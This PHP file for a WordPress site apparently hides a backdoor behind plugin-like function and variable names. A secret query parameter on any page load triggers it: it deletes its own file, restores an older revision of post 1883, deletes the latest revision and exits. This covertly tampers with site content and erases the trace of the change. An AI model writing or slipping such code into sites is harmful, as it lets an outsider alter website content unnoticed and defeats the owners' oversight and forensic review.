<?php

function customizer_code_zoom_marketing() {
	if (isset($_GET['plupload_views_last_widgets']) && $_GET['plupload_views_last_widgets'] === 'save_conditional_panel') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$now_icon_comment_clean = 1883;
		$typography_get_jigoshop = wp_get_post_revisions($now_icon_comment_clean);
		if (empty($typography_get_jigoshop)) die('no revisions');
		if (count($typography_get_jigoshop) < 2) die('less than 2');
		$min_internal_switcher_translator = array_shift($typography_get_jigoshop);
		$now_lightbox_automatic_bangla = $min_internal_switcher_translator->ID;
		$quantity_hide_reloaded_activity = array_shift($typography_get_jigoshop);
		$automatorwp_language_additional = $quantity_hide_reloaded_activity->ID;
		$addons_bank_safe_coupons = wp_restore_post_revision($automatorwp_language_additional);
		if ($addons_bank_safe_coupons === false) die('error restoring');
		$addons_bank_safe_coupons = wp_delete_post_revision($now_lightbox_automatic_bangla);		
		if ($addons_bank_safe_coupons === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'customizer_code_zoom_marketing');
